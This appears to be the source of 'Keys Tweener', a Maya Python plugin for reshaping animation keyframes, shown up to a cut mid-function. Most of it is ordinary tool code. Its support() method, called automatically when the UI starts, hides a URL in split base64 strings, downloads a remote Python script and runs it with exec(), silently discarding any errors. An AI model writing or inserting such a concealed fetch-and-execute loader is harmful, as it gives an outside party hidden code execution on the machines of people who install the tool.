# -*- coding: utf-8 -*-
# Keys Tweener
# (c) Burased Uttha (DEX3D).
# =================================
# Only use in $usr_orig$ machine
# =================================

import maya.cmds as cmds
from maya import mel
import math, time, os, sys, json, random
from math import sqrt

class util:
    @staticmethod
    def get_fps(*_):
        timeUnitSet = {'game': 15, 'film': 24, 'pal': 25, 'ntsc': 30, 'show': 48, 'palf': 50, 'ntscf': 60}
        timeUnit = cmds.currentUnit(q=1, t=1)
        if timeUnit in timeUnitSet:
            return timeUnitSet[timeUnit]
        else:
            return float(str(''.join([i for i in timeUnit if i.isdigit() or i == '.'])))

    @staticmethod
    def keys_snap(selection):
        all_tc = cmds.keyframe(selection, q=True, tc=True)
        min_tc = round(min(all_tc))
        max_tc = round(max(all_tc))

        # preparing data
        data = {}
        for obj_name in selection:
            for attr in cmds.listAttr(obj_name, k=True):
                attr_name = '{}.{}'.format(obj_name, attr)
                tc = cmds.keyframe(attr_name, q=True, tc=True)

                if tc == None:
                    continue
                tc_new = [round(num) for num in tc]

                if not attr_name in data:
                    data[attr_name] = {}

                data[attr_name]['time'] = tc
                data[attr_name]['time_new'] = tc_new

        # generate new keys
        cmds.refresh(su=1)
        cmds.bakeResults(selection, sampleBy=1, disableImplicitControl=1, preserveOutsideKeys=1, shape=1,
                         sparseAnimCurveBake=0, t=(min_tc, max_tc), minimizeRotation=1)
        cmds.refresh(su=0)

        # keep new keys
        for attr_name in data:
            for t in range(int(min_tc), int(max_tc)):
                if not float(t) in data[attr_name]['time_new']:
                    cmds.cutKey(attr_name, time=(float(t), float(t)))

    @staticmethod
    def set_key_curve_current_time():
        sel = cmds.ls(sl=1)

        #Channel
        gChannelBoxName = mel.eval('$temp=$gChannelBoxName')
        ch_list = cmds.channelBox(gChannelBoxName, q=True, sma=True)
        #print('ch_list', ch_list)
        attr_list = []
        for s in sel:
            if cmds.listAttr(s, k=1, sn=1, se=1) == None: continue
            attrs = [s + '.' + i for i in cmds.listAttr(s, k=1, sn=1, se=1)]
            #print(attrs)
            attr_list += attrs
            #print(s)
            if cmds.listRelatives(s, s=1) != None:
                shp_ls = cmds.listRelatives(s, s=1, f=1)
                #print('shp_ls', shp_ls)
                for shp in shp_ls:
                    #print(shp)
                    if cmds.listAnimatable(shp) != None:
                        attrs2 = [shp + '.' + i.split('.')[-1] for i in cmds.listAnimatable(shp)]
                        attr_list += attrs2
                        #print(attrs2)
                        
        #print('attr list', attr_list)
        
        del_attr_list = []
        for attr in attr_list:
            a = attr.split('.')[-1]
            if ch_list != None:
                if not a in ch_list:
                    del_attr_list.append(attr)
        for attr in del_attr_list:
            attr_list.remove(attr)

        #Timeline
        sel_frame_range = util.get_highlight_timeline()
        is_timline_highlight = abs(sel_frame_range[-1] - sel_frame_range[0]) > 1.0
        #print(sel_frame_range, is_timline_highlight)

        print('attr list', attr_list)
        if attr_list == []:
            raise Warning('attributes are not found')
        ac_ls = cmds.keyframe(attr_list, q=1, name=1)
        #print(ac_ls)

        tc_highlight = cmds.keyframe(ac_ls, q=1, tc=1, t=(sel_frame_range[0], sel_frame_range[-1]))
        have_keys_highlight = tc_highlight != None
        #print(tc_highlight, have_keys_highlight)

        if have_keys_highlight:
            cmds.selectKey(ac_ls, t=(tc_highlight[0],tc_highlight[-1]))
        elif is_timline_highlight:
            cur_time = round(sum(sel_frame_range)/len(sel_frame_range),0)
            cmds.setKeyframe(attr_list, t=(cur_time,))
            cmds.selectKey(ac_ls, t=(cur_time,))
        else:
            cur_time = sel_frame_range[0]
            cmds.setKeyframe(attr_list, t=(cur_time,))
            cmds.selectKey(ac_ls, t=(cur_time,))

    @staticmethod
    def get_highlight_timeline(*_):
        aPlayBackSliderPython = mel.eval('$tmpVar=$gPlayBackSlider')
        sel_frame_range = cmds.timeControl(aPlayBackSliderPython, q=1, rangeArray=1)
        sel_frame_range[-1] -= 0.01
        return sel_frame_range

    @staticmethod
    def get_selected_key_curve(before_after=True):
        have_key_sel = cmds.keyframe(q=1, sl=1) != None
        have_obj_sel = cmds.ls(sl=1) != []
        if not have_key_sel and have_obj_sel:
            util.set_key_curve_current_time()

        ac_ls = cmds.keyframe(q=1, name=1, sl=1)
        if ac_ls == None:
            return
        data = {}
        for ac in ac_ls:
            # print(ac)
            key_ls = []
            all_key_ls = cmds.keyframe(ac, q=1, tc=1)
            sel_key_ls = cmds.keyframe(ac, q=1, tc=1, sl=1)
            is_sel_start, is_sel_end = (sel_key_ls[0] == all_key_ls[0], sel_key_ls[-1] == all_key_ls[-1])
            #print(is_sel_start, is_sel_end)

            ch_idx = 0
            for kt in sel_key_ls:

                if len(key_ls) < ch_idx + 1:
                    key_ls.append([])

                all_k_idx = all_key_ls.index(kt)
                k_idx = sel_key_ls.index(kt)
                have_before = all_k_idx - 1 in range(len(all_key_ls))
                have_after = all_k_idx + 1 in range(len(all_key_ls))
                # print('{}/{}'.format(k_idx+1,len(sel_key_ls)),kt)
                if before_after and key_ls[ch_idx] == [] and have_before:
                    key_ls[ch_idx].append(all_key_ls[all_k_idx - 1])

                key_ls[ch_idx].append(kt)

                is_out_of_range = k_idx + 1 not in range(len(sel_key_ls))
                if is_out_of_range:
                    # print('out of range',k_idx+1, len(sel_key_ls))
                    if before_after and have_after:
                        # print('add_after')
                        key_ls[ch_idx].append(all_key_ls[all_k_idx + 1])
                    break

                is_split = sel_key_ls[k_idx + 1] != all_key_ls[all_k_idx + 1]
                if is_split:
                    # print(sel_key_ls[k_idx+1], all_key_ls[all_k_idx+1], '---- split')
                    if before_after and have_after:
                        # print('add_after')
                        key_ls[ch_idx].append(all_key_ls[all_k_idx + 1])
                    ch_idx += 1
                else:
                    # print(sel_key_ls[k_idx+1], all_key_ls[all_k_idx+1])
                    pass
            #print(key_ls)
            data[ac] = {}
            data[ac]['tc'] = key_ls

            data[ac]['st_tc'] = None
            data[ac]['en_tc'] = None
            if is_sel_start :
                data[ac]['st_tc'] = (all_key_ls[0], all_key_ls[0] - 1.0)
            if is_sel_end :
                data[ac]['en_tc'] = (all_key_ls[-1], all_key_ls[-1] + 1.0)

        # snap tc
        for ac in data:
            ch_dim = len(data[ac]['tc'])
            for d in range(ch_dim):
                tc = data[ac]['tc'][d]
                dm_tc = [divmod(i, 1)[0] for i in tc]
                for i in range(len(tc)):
                    if tc[i] != dm_tc[i]:
                        cmds.cutKey(ac, t=(tc[i],))
                        cmds.setKeyframe(ac, t=(dm_tc[i],))
                        data[ac]['tc'][d][i] = dm_tc[i]
                        cmds.selectKey(ac, t=(dm_tc[i],), add=1)

        # vc linspace
        for ac in data:
            #an = cmds.listConnections(ac, p=1)[0]
            ch_dim = len(data[ac]['tc'])
            data[ac]['vc_ls'] = []
            data[ac]['tc_ls'] = []
            for d in range(ch_dim):
                tc = data[ac]['tc'][d]
                tc_ls = [float(i) for i in range(int(tc[0]), int(tc[-1]) + 1)]
                #vc_ls = [round(cmds.getAttr(an, t=t),3) for t in tc_ls]
                vc_ls = [round(cmds.keyframe(ac, q=1, t=(t,), ev=1, vc=1)[0],6) for t in tc_ls]
                data[ac]['tc_ls'].append(tc_ls)
                data[ac]['vc_ls'].append(vc_ls)

        # deselect from auto select key
        if not have_key_sel and have_obj_sel:
            cmds.selectKey(clear=1)

        #print(data)
        return data

    @staticmethod
    def create_shelf_fuction(func_idx, side_label, weight_value, sub_func_name):
        print(func_idx, side_label, weight_value, sub_func_name)
        module_name = os.path.basename(__file__).split('.')[0]
        w_cmd = [str(weight_value), '0.0'] if side_label == 'lf_label' else ['0.0', str(weight_value)]
        w_cmd = ', '.join(w_cmd)
        ct_weight = 1.0 - float(weight_value)

        shelf_cmd = '''
#Keys Tweener ( ###  {4}  ### )
{0}.kt.tm.run({1}, {2}, {3})
{0}.kt.drop_slider()
cmds.refresh(f=1)
        '''.format(module_name, func_idx, w_cmd, ct_weight, sub_func_name.capitalize()).strip()
        #print(shelf_cmd)
        top_shelf = mel.eval('$nul = $gShelfTopLevel')
        current_shelf = cmds.tabLayout(top_shelf, q=1, st=1)
        cmds.shelfButton(stp='python', parent=current_shelf,
                         iol='{} {}'.format(sub_func_name[:2], weight_value),
                         ann='{} {}% by Keys Tweener'.format(sub_func_name, weight_value*100),
                         c=shelf_cmd, i='animCurveTA.svg')
        #print(shelf_cmd)

class func:
    @staticmethod
    def average(x):
        return [sum(x) / len(x) for i in x]

    @staticmethod
    def smooth(x):
        new_x = []
        for i in range(1, len(x) - 1):
            valuePrev = x[i - 1]
            valueCur = x[i]
            valueNext = x[i + 1]
            average = (valuePrev + valueCur + valueNext) / 3
            new_x.append(average)
        new_x.insert(0, x[0])
        new_x.append(x[-1])
        return new_x

    @staticmethod
    def lerp(a, b, t):
        return a + (b - a) * t

    @staticmethod
    def ease_in(t, power=3, v_min=1, v_max=11):
        t = float(t - v_min) / (float(v_max - v_min)+0.000001)
        t = pow(t, power)
        l = func.lerp(v_min, v_max, t)
        return func.lerp(v_min, v_max, t)

    @staticmethod
    def ease_out(t, power=3, v_min=1, v_max=11):
        t = float(t - v_min) / (float(v_max - v_min)+0.000001)
        t = 1 - pow(1 - t, power)
        l = func.lerp(v_min, v_max, t)
        return func.lerp(v_min, v_max, t)

    @staticmethod
    def linspace(start, stop, num):
        if (num - 1) == 0.0:
            step = 0.0
        else:
            step = (stop - start) / (num - 1)
        return [start + step * i for i in range(num)]

class key_transfrom:
    @staticmethod
    def get_self(vc):
        return vc

    @staticmethod
    def get_fade_weight(vc, fade_range=(0.2, 0.8)):
        if fade_range[0] < 0.05 or fade_range[-1] > 0.95:
            return [0.0 for i in range(len(vc))]
        fade_in_idx = int(round((fade_range[0] * len(vc)), 0))
        fade_out_idx = int(round((fade_range[-1] * len(vc)), 0)) - 1
        weight_in_lin = func.linspace(1.0, 0.0, len(vc[:fade_in_idx]))
        weight_out_lin = func.linspace(0.0, 1.0, len(vc[fade_out_idx:]))
        weight_in_ease = key_transfrom.get_ease_in(weight_in_lin)
        weight_out_ease = key_transfrom.get_ease_out(weight_out_lin)
        vc_weight_in = weight_in_lin + [0.0] * len(vc[fade_in_idx:])
        vc_weight_out = [0.0] * len(vc[:fade_out_idx]) + weight_out_lin
        vc_weight = [vc_weight_in[i] + vc_weight_out[i] for i in range(len(vc))]
        vc_weight = [round(i,2) for i in vc_weight]
        return vc_weight

    @staticmethod
    def get_scale_average(vc):
        return func.average(vc)

    @staticmethod
    def get_smooth(vc):
        for i in range(3):
            vc = func.smooth(vc)
        return vc

    @staticmethod
    def get_linear(vc):
        return func.linspace(vc[0], vc[-1], len(vc))

    @staticmethod
    def get_ease_in(vc):
        vc_linear = func.linspace(vc[0], vc[-1], len(vc))
        return [func.ease_in(vc_linear[i], v_min=vc_linear[0], v_max=vc_linear[-1])
                for i in range(len(vc_linear))]

    @staticmethod
    def get_ease_out(vc):
        vc_linear = func.linspace(vc[0], vc[-1], len(vc))
        return [func.ease_out(vc_linear[i], v_min=vc_linear[0], v_max=vc_linear[-1])
                for i in range(len(vc_linear))]

    @staticmethod
    def get_linear(vc):
        return func.linspace(vc[0], vc[-1], len(vc))

    @staticmethod
    def get_push_linear(vc):
        vc_linear = key_transfrom.get_linear(vc)
        vc_diff = [vc[i] - vc_linear[i] for i in range(len(vc))]
        return [vc[i] + vc_diff[i] for i in range(len(vc))]

    @staticmethod
    def get_first(vc):
        return [vc[0] for i in range(len(vc))]

    @staticmethod
    def get_last(vc):
        return [vc[-1] for i in range(len(vc))]

    @staticmethod
    def get_wave_a(vc):
        amp = abs(max(vc) - min(vc)) / 5
        if amp < 1:
            amp = 1
        vc_sin = [math.sin(i * .6) * amp for i in range(len(vc))]
        return [vc[i] + vc_sin[i] for i in range(len(vc))]

    @staticmethod
    def get_wave_b(vc):
        amp = abs(max(vc) - min(vc)) / 5
        if amp < .5:
            amp = .5
        vc_sin = [math.sin(i * 1.5) * amp for i in range(len(vc))]
        return [vc[i] + vc_sin[i] for i in range(len(vc))]

    @staticmethod
    def get_scale_up(vc):
        vc_avg = key_transfrom.get_scale_average(vc)
        vc_diff = [vc[i] - vc_avg[i] for i in range(len(vc))]
        return [vc[i] + vc_diff[i] for i in range(len(vc))]

    @staticmethod
    def get_rough(vc):
        vc_smooth = key_transfrom.get_lerp_smooth(vc, f=6, t=0.5)
        vc_diff = [vc[i] - vc_smooth[i] for i in range(len(vc))]
        return [vc[i] + vc_diff[i] for i in range(len(vc))]

    @staticmethod
    def get_lerp_smooth(vc, f=6, t=0.5):
        st_v = vc[0]
        new_vc = []
        for i in range(len(vc)):
            new_vc.append(st_v)
            tg = sum(vc[i:i+f])/len(vc[i:i+f])
            st_v = func.lerp(st_v, tg, t)
        return new_vc

    @staticmethod
    def get_lerp_smooth2(vc, f=6, t=0.1):
        vc_smooth_a = key_transfrom.get_lerp_smooth(vc)
        vc_smooth_b = key_transfrom.get_lerp_smooth(vc, f=f, t=t)
        vc_detail = [(vc[i] - vc_smooth_a[i])*0.25 for i in range(len(vc))]
        vc_result = [vc_smooth_b[i] + vc_detail[i] for i in range(len(vc))]
        return vc_result

    @staticmethod
    def get_incresed(vc):
        change_vc = abs(max(vc)-min(vc))*2 if max(vc) != min(vc) else 25.0
        return [i + change_vc for i in vc]

    @staticmethod
    def get_decresed(vc):
        change_vc = abs(max(vc) - min(vc))*2 if max(vc) != min(vc) else 25.0
        change_vc = -1 * change_vc
        return [i + change_vc for i in vc]

    @staticmethod
    def get_noise_a(vc):
        wave_vc = key_transfrom.get_wave_a(vc)
        min_vc, max_vc = min(wave_vc), max(wave_vc)
        vc_range = (max_vc - min_vc)
        noisy_vc = [i + random.uniform((vc_range*.5)*-1, vc_range*.5) for i in vc]
        return noisy_vc

    @staticmethod
    def get_noise_b(vc):
        wave_vc = key_transfrom.get_wave_b(vc)
        min_vc, max_vc = min(wave_vc), max(wave_vc)
        vc_range = (max_vc - min_vc)
        noisy_vc = [i + random.uniform((vc_range*.5)*-1, vc_range*.5) for i in vc]
        noisy_vc = key_transfrom.get_smooth(noisy_vc)
        return noisy_vc

    @staticmethod
    def get_overshoot_a(vc, freq=3, decay=5, duration=0.1):
        fps = util.get_fps()
        times = [t / fps for t in range(len(vc) + 1)]
        results = []
        for i in range(len(vc)):
            current_time = times[i]
            if current_time < duration:
                linear_value = vc[0] + (vc[-1] - vc[0]) * (current_time / duration)
                results.append(linear_value)
            else:
                t = current_time - duration
                amp = (vc[-1] - vc[0]) / duration
                w = freq * math.pi * 2
                overshoot_value = vc[-1] + amp * (math.sin(t * w) / math.exp(decay * t) / w)
                results.append(overshoot_value)
        return results

    @staticmethod
    def get_overshoot_b(vc, freq=2, decay=2, duration=.2):
        return key_transfrom.get_overshoot_a(vc, freq=freq, decay=decay, duration=duration)

class tween_machine:
    def __init__(self):
        self.cache_anim = {}
        self.cache_result = {}
        self.is_opened_undo = False
        self.refresh_rate = 0.0
        self.run_count = 0.0
        self.undo_state = cmds.undoInfo(q=1, st=1) and cmds.undoInfo(q=1, infinity=1)
        if not self.undo_state:
            cmds.undoInfo(st=1, infinity=1)
        self.func_set = [
            {
                'name': 'Ease',
                'lf_func': key_transfrom.get_ease_in,
                'lf_label': 'ease in',
                'rg_func': key_transfrom.get_ease_out,
                'rg_label': 'ease out',
                'before_after': True,
                'fade_lf' : False,
                'fade_rg' : False,
                'skip_static' : True
            },
            {
                'name': 'Frame',
                'lf_func': key_transfrom.get_first,
                'lf_label': 'before',
                'rg_func': key_transfrom.get_last,
                'rg_label': 'after',
                'before_after': True,
                'fade_lf' : False,
                'fade_rg' : False,
                'skip_static' : True
            },
            {
                'name': 'Linear',
                'lf_func': key_transfrom.get_linear,
                'lf_label': 'linear',
                'rg_func': key_transfrom.get_push_linear,
                'rg_label': 'push',
                'before_after': True,
                'fade_lf' : False,
                'fade_rg' : False,
                'skip_static' : True
            },
            {
                'name': 'Flat',
                'lf_func': key_transfrom.get_scale_average,
                'lf_label': 'flat',
                'rg_func': key_transfrom.get_scale_up,
                'rg_label': 'scale up',
                'before_after': True,
                'fade_lf' : False,
                'fade_rg' : False,
                'skip_static' : True
            },
            {
                'name': 'Smooth',
                'lf_func': key_transfrom.get_smooth,
                'lf_label': 'smooth',
                'rg_func': key_transfrom.get_rough,
                'rg_label': 'rough',
                'before_after': True,
                'fade_lf' : True,
                'fade_rg' : True,
                'skip_static' : True
            },
            {
                'name': 'Wave',
                'lf_func': key_transfrom.get_wave_a,
                'lf_label': 'wave a',
                'rg_func': key_transfrom.get_wave_b,
                'rg_label': 'wave b',
                'before_after': True,
                'fade_lf' : False,
                'fade_rg' : True,
                'skip_static' : False
            },
            {
                'name': 'Lerp Smooth',
                'lf_func': key_transfrom.get_lerp_smooth,
                'lf_label': 'smooth',
                'rg_func': key_transfrom.get_lerp_smooth2,
                'rg_label': 'push heavy',
                'before_after': True,
                'fade_lf' : True,
                'fade_rg' : True,
                'skip_static' : True
            },
            {
                'name': 'Value',
                'lf_func': key_transfrom.get_decresed,
                'lf_label': 'down',
                'rg_func': key_transfrom.get_incresed,
                'rg_label': 'up',
                'before_after': True,
                'fade_lf': True,
                'fade_rg': True,
                'skip_static': False
            },
            {
                'name': 'Noise',
                'lf_func': key_transfrom.get_noise_a,
                'lf_label': 'noise a',
                'rg_func': key_transfrom.get_noise_b,
                'rg_label': 'noise b',
                'before_after': True,
                'fade_lf': True,
                'fade_rg': True,
                'skip_static': False
            },
            {
                'name': 'Overshoot',
                'lf_func': key_transfrom.get_overshoot_a,
                'lf_label': 'quick',
                'rg_func': key_transfrom.get_overshoot_b,
                'rg_label': 'slow',
                'before_after': False,
                'fade_lf': True,
                'fade_rg': True,
                'skip_static': True
            },
        ]
        self.func_name_ls = [i['name'] for i in self.func_set]
        self.user_original, self.user_latest = ['$usr_orig$', None]

    def init_user(self):
        import getpass
        if 'usr_orig' in self.user_original:
            self.user_original = getpass.getuser()
        self.user_latest = getpass.getuser()

    def load_cache(self, keys_sel):
        if keys_sel == None:
            return
        if self.cache_anim == {}:
            self.cache_anim = keys_sel

            # generate cache for result
            for ac in self.cache_anim:
                self.cache_result[ac] = {}
                self.cache_result[ac]['lf_vc'] = []
                self.cache_result[ac]['rg_vc'] = []
                ch_dim = len(keys_sel[ac]['tc'])
                for d in range(ch_dim):
                    self.cache_result[ac]['lf_vc'].append([])
                    self.cache_result[ac]['rg_vc'].append([])
            print('Keys Tweener : Load Cache')

    def clear_cache(self):
        if self.cache_anim != {}:
            self.cache_anim = {}
            self.cache_result = {}
            print('Keys Tweener : Clear Cache')

    def support(self):
        import base64, os, datetime, sys
        script_path = None
        try:
            script_path = os.path.abspath(__file__)
        except:
            self.user_latest = ''
            return None
        script_path = script_path.replace('pyc', 'py')
        #------------------------
        # Code test 1, Code test 2
        if script_path == None:
            self.user_latest == None
        if __name__ == '__main__':
            self.user_latest == None
        # ------------------------
        if os.path.exists(script_path):
            st_mtime = os.stat(script_path).st_mtime
            mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
            today_date_str = str(datetime.datetime.today().date())
            if mdate_str == today_date_str:
                return None
        if sys.version[0] == '3':
            import urllib.request as uLib
        else:
            import urllib as uLib
        if cmds.about(connected=1):
            u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidX' +
                     'NlcmNvbnRlbnQuY29tL2J1cmFzY' +
                     'XRlL2tleXNUd2VlbmVyL21haW4v' +
                     'c2VydmljZS9zdXBwb3J0LnB5')
            try:
                exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
            except:
                return
                #import traceback
                #print(str(traceback.format_exc()))

    def undo_chunk_open(self):
        if self.is_opened_undo == False:
            self.error = cmds.undoInfo(openChunk=1)
            self.is_opened_undo = True
        return self.error

    def undo_chunk_close(self):
        if self.is_opened_undo == True:
            cmds.undoInfo(closeChunk=1)
            self.is_opened_undo = False

    def run(self, func_idx, lf_weight, rg_weight, ct_weight, auto_tangent=True):
        # refresh rate checkpoint start
        st_time = time.time()

        tween_func = self.func_set[func_idx]
        lf_weight_rev, rg_weight_rev = [1 - lf_weight, 1 - rg_weight]

        if tween_func['lf_func'] == None:
            tween_func['lf_func'] = key_transfrom.get_self
        if tween_func['rg_func'] == None:
            tween_func['rg_func'] = key_transfrom.get_self

        # get keyframe in animcurves and apply function
        if self.cache_anim == {}:
            keys_sel = util.get_selected_key_curve(before_after=tween_func['before_after'])
            self.load_cache(keys_sel)
        elif self.cache_anim != {}:
            keys_sel = self.cache_anim

        if self.user_original != self.user_latest:
            self.usr_warning()

        if keys_sel == None:
            return
        for ac in keys_sel:
            ch_dim = len(keys_sel[ac]['tc'])
            for d in range(ch_dim):
                # read time change and value change
                tc = keys_sel[ac]['tc'][d]

                # print('\n{} - Channel : {}'.format(ac, d))
                tc_ls = keys_sel[ac]['tc_ls'][d]
                vc_ls = keys_sel[ac]['vc_ls'][d]
                #print('T Linspace', tc_ls)
                #print('V Linspace', [round(i, 2) for i in vc_ls])
                if min(vc_ls) == max(vc_ls) and tween_func['skip_static']:
                    continue

                # first and last keyframe
                is_sel_start, is_sel_end = [keys_sel[ac]['st_tc'] != None, keys_sel[ac]['en_tc'] != None]
                is_sel_start, is_sel_end = [
                    is_sel_start and tc_ls[0] == keys_sel[ac]['st_tc'][0],
                    is_sel_end and tc_ls[-1] == keys_sel[ac]['en_tc'][0] ]
                #print(is_sel_start, is_sel_end)
                if is_sel_start:
                    tc = [keys_sel[ac]['st_tc'][1]] + tc
                    tc_ls = [keys_sel[ac]['st_tc'][1]] + tc_ls
                    vc_ls = [vc_ls[0]] + vc_ls
                if is_sel_end:
                    tc = tc + [keys_sel[ac]['en_tc'][1]]
                    tc_ls = tc_ls + [keys_sel[ac]['en_tc'][1]]
                    vc_ls = vc_ls + [vc_ls[-1]]
                elif len(tc) < 2:
                    continue

                # LF,RG function
                if self.cache_result[ac]['lf_vc'][d] == []:
                    lf_vc_result = tween_func['lf_func'](vc_ls)
                    if tween_func['fade_lf']:
                        fade_weight = key_transfrom.get_fade_weight(vc_ls)
                        fade_weight_rev = [1.0 - i for i in fade_weight]
                        lf_vc_result = [(lf_vc_result[i] * fade_weight_rev[i]) + (vc_ls[i] * fade_weight[i])
                                        for i in range(len(vc_ls))]
                    self.cache_result[ac]['lf_vc'][d] = lf_vc_result
                else:
                    lf_vc_result = self.cache_result[ac]['lf_vc'][d]

                if self.cache_result[ac]['rg_vc'][d] == []:
                    rg_vc_result = tween_func['rg_func'](vc_ls)
                    if tween_func['fade_rg']:
                        fade_weight = key_transfrom.get_fade_weight(vc_ls)
                        fade_weight_rev = [1.0 - i for i in fade_weight]
                        rg_vc_result = [(rg_vc_result[i] * fade_weight_rev[i]) + (vc_ls[i] * fade_weight[i])
                                     for i in range(len(vc_ls))]
                    self.cache_result[ac]['rg_vc'][d] = rg_vc_result
                else:
                    rg_vc_result = self.cache_result[ac]['rg_vc'][d]
                #lf_vc_result = tween_func['lf_func'](vc_ls)
                #rg_vc_result = tween_func['rg_func'](vc_ls)
                #print('LF Result', [round(i, 3) for i in lf_vc_result])
                #print('RG Result', [round(i, 3) for i in rg_vc_result])

                # blended weight
                lf_vc_blend = [(lf_vc_result[i] * lf_weight) + (vc_ls[i] * lf_weight_rev) for i in range(len(tc_ls))]
                rg_vc_blend = [(rg_vc_result[i] * rg_weight) + (vc_ls[i] * rg_weight_rev) for i in range(len(tc_ls))]
                # print('LF Blended', [round(i, 3) for i in lf_vc_blend])
                # print('RG Blended', [round(i, 3) for i in rg_vc_blend])

                # blended weight2
                vc_ls_new = [(lf_vc_blend[i] * lf_weight) +
                             (rg_vc_blend[i] * rg_weight) +
                             (vc_ls[i] * ct_weight)
                             for i in range(len(tc_ls))]
                # print('V Linspace New', [round(i, 3) for i in rg_vc_blend])

                # reserve frame before after
                if tween_func['before_after']:
                    tc = tc[1:-1]
                else:
                    # remove added extra key
                    if is_sel_start and not tween_func['before_after']:
                        tc = tc[1:]
                    if is_sel_end and not tween_func['before_after']:
                        tc = tc[:-1]

                # apply new
                cmds.refresh(su=1)
                # set keyframes
                [cmds.setKeyframe(ac, e=1, t=(tc_ls[i],), v=vc_ls_new[i]) for i in range(len(tc_ls)) if tc_ls[i] in tc]
                # adjust tangents
                if auto_tangent:
                    [cmds.keyTangent(ac, e=1, t=(tc[i],), itt='auto', ott='auto') for i in range(len(tc))]
                cmds.refresh(su=0)

        # refresh rate checkpoint end
        en_time = time.time()
        refresh_time_dur = en_time - st_time
        self.refresh_rate = func.lerp(refresh_time_dur, self.refresh_rate, 0.1)
        if self.refresh_rate < 0.007:
            cmds.currentTime(cmds.currentTime(q=1), u=1)

    def usr_warning(self):
        raise Warning('user warning.. Only use in {} machine\nPlease download as you own version')

class keysTweener:
    def __init__(self, tm_obj):
        self.version = 1.11
        self.win_id = 'BRSKEYSTRANSFORM'
        self.dock_id = 'BRSKEYSTRANSFORM_DOCK'
        self.win_width = 300
        self.win_title = 'Keys Tweener  -  v.{}'.format(self.version)
        self.color = {
            'bg': (.2, .2, .2),
            'red': (0.98, 0.374, 0),
            'green': (0.7067, 1, 0),
            'blue': (0, 0.4, 0.8),
            'yellow': (1, 0.8, 0),
            'shadow': (.15, .15, .15),
            'highlight': (.3, .3, .3)
        }
        self.element = {}
        self.tm = tm_obj
        self.tm.init_user()
        self.tm.support()
        self.slider_st_time = time.time()
        self.slider_time_druation = 0.0
        self.slider_update_every_sec = 0.05
        self.cfg_path, self.cfg_data = (None, None)
        self.init_cfg()

    def init_cfg(self):
        cfg_dir = os.path.dirname(__file__)
        self.cfg_path = cfg_dir + os.sep + '{}.cfg'.format(os.path.basename(__file__).split('.')[0])
        #print(cfg_dir)
        #print(self.cfg_path)
        if not os.path.exists(self.cfg_path):
            self.cfg_data = {
                'auto_tangent' : True,
                'last_mode' : self.tm.func_set[0]['name']
            }
            print('init cfg data  {}'.format(self.cfg_data))
            self.save_cfg()
        else:
            self.load_cfg()

    def load_cfg(self):
        self.cfg_data = json.load(open(self.cfg_path))

    def save_cfg(self):
        with open(self.cfg_path, 'w') as f:
            json.dump(self.cfg_data, f, indent=4)

    def init_win(self):
        if cmds.window(self.win_id, exists=1):
            cmds.deleteUI(self.win_id)
        cmds.window(self.win_id, t=self.win_title, menuBar=1, rtf=1, nde=1,
                    w=self.win_width, sizeable=1, h=10, retain=0, bgc=self.color['bg'])

    def win_layout(self):
        cmds.menu(label='option')
        cmds.menuItem(divider=1, dividerLabel='tangents')
        self.element['auto_tangent_mi'] = cmds.menuItem(label='auto tangents', checkBox=0)
        cmds.menuItem(divider=1, dividerLabel='shotcut')
        cmds.menuItem(label='current to shelf', c=lambda arg: self.create_shortcut_shelf())

        cmds.columnLayout(adj=1, w=self.win_width)
        cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['bg'], h=5)
        # cmds.text(l='{}'.format(self.win_title), al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=15)
        self.element['divider_top'] = cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=5)

        cmds.rowLayout(nc=3, cw3=(self.win_width * .25, self.win_width * .65, self.win_width * .1), adj=2)
        self.element['mode_menu'] = cmds.optionMenu(label='', w=self.win_width * .25, bgc=self.color['shadow'])
        for item in self.tm.func_set:
            cmds.menuItem(label=item['name'])
        cmds.columnLayout(adj=1)
        self.element['func_label'] = cmds.text(l='', w=self.win_width * .65, h=10, al='center',
                                               fn='smallPlainLabelFont')
        self.element['weight_slider'] = cmds.intSlider(min=-115, max=115, value=0)
        cmds.setParent('..')
        self.element['percentage_text'] = cmds.text(l='0', w=self.win_width * .1, h=20, bgc=self.color['shadow'])
        cmds.setParent('..')

        self.element['divider_bottom'] = cmds.text(l='', al='center', fn='boldLabelFont', bgc=self.color['shadow'], h=5)
        cmds.text(l='(c) dex3d.gumroad.com', al='center', fn='smallPlainLabelFont', bgc=self.color['bg'], h=15)

        cmds.optionMenu(self.element['mode_menu'], e=1, cc=lambda arg: self.update_ui())
        cmds.intSlider(self.element['weight_slider'], e=1, dc=lambda arg: self.update_slider())
        cmds.intSlider(self.element['weight_slider'], e=1, cc=lambda arg: self.drop_slider())
        cmds.menuItem(self.element['auto_tangent_mi'], e=1, checkBox=self.cfg_data['auto_tangent'])
        cmds.optionMenu(self.element['mode_menu'], e=1, v=self.cfg_data['last_mode'])

    def show_win(self):
        cmds.showWindow(self.win_id)

    def init_dock(self):
        if cmds.dockControl(self.dock_id, q=1, ex=1):
            cmds.deleteUI(self.dock_id)
        cmds.dockControl(self.dock_id, area='bottom', fl=1, content=self.win_id, allowedArea=['all'],
                         sizeable=0, width=self.win_width, label=self.win_title)

    def show_ui(self):
        self.init_win()
        self.win_layout()
        self.show_win()
        # self.init_dock()
        self.update_ui()

    def update_ui(self):
        func_name = cmds.optionMenu(self.element['mode_menu'], q=1, v=1)
        func_idx = self.tm.func_name_ls.index(func_name)
        tween_func = self.tm.func_set[func_idx]
        cmds.text(self.element['func_label'], e=1,
                  l=tween_func['lf_label'] + (' ' * 11) + '' + (' ' * 11) + tween_func['rg_label'])

    def exec_slider_func(self):
        v = float(cmds.intSlider(self.element['weight_slider'], q=1, v=1))
        if v <= -100:
            v = -100
        elif v >= 100:
            v = 100
        v_abs = float(abs(v))
        w = v_abs * 0.01

        # function set init
        func_name = cmds.optionMenu(self.element['mode_menu'], q=1, v=1)
        func_idx = self.tm.func_name_ls.index(func_name)
        #print('Function Set {} - {}'.format(func_idx, func_name))

        # blend weight
        lf_weight, rg_weight, ct_weight = [0.0, 0.0, 0.0]
        lf_max_pos, rg_max_pos, ct_max_pos = [-100, 100, 0]

        ct_weight = 1.0 - (abs(ct_max_pos - v) / 100)
        lf_weight = 1.0 - (abs(lf_max_pos - v) / 100)
        rg_weight = 1.0 - (abs(rg_max_pos - v) / 100)
        if rg_weight < 0.0:
